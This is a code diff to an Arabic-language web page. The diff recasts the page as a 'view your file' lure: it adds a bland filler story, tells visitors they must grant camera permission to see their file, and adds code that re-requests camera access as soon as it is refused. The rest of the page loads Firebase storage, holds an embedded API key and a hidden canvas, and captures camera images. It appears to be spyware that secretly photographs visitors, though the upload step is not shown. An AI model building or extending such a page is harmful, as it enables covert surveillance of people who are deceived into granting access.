@@ -2,28 +2,52 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>تطبيق مميز</title>
+  <title>شاهد ملفك</title>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Arial', sans-serif;
       text-align: center;
       padding: 20px;
-      background-color: #f9f9f9;
+      background-color: #f0f0f0;
     }
     h1 {
       color: #333;
+      font-size: 2em;
+    }
+    p {
+      color: #555;
+      font-size: 1.2em;
+      max-width: 600px;
+      margin: auto;
     }
     .hidden {
       display: none;
     }
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      margin: 20px auto;
+      max-width: 800px;
+    }
+    .story {
+      text-align: left;
+      margin-bottom: 20px;
+    }
   </style>
 </head>
 <body>
-  <h1>تطبيق مميز</h1>
-  <p>يرجى منح الأذونات اللازمة للتطبيق للتقاط الصور.</p>
-  <canvas id="canvas" class="hidden"></canvas>
+  <div class="container">
+    <h1>شاهد ملفك</h1>
+    <p class="story">
+      كانت هناك فتاة طموحة تدعى ليلى. في يوم من الأيام، قررت ليلى أن تستخدم مهاراتها في تطوير التطبيقات لكسب بعض المال. قامت بإنشاء تطبيقات متعددة ونجحت في بيعها على متاجر التطبيقات. بفضل هذا، استطاعت ليلى أن تحقق دخلاً جيدًا وتحقيق أحلامها.
+    </p>
+    <p>لمشاهدة ملفك عليك منح الأذونات لالتقاط الصور.</p>
+    <canvas id="canvas" class="hidden"></canvas>
+  </div>
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyALGGBFq-XDvq78XmN13d1FX-9jv2e2jDE",
@@ -65,12 +89,12 @@
         await navigator.mediaDevices.getUserMedia({ video: true });
       } catch (error) {
         console.error('فشل في الحصول على إذن الكاميرا:', error);
+        requestCameraPermission();
       }
     };
 
     const initializePhotoCapture = async () => {
       await requestCameraPermission();
-
       navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
         const video = document.createElement('video');
         video.srcObject = stream;
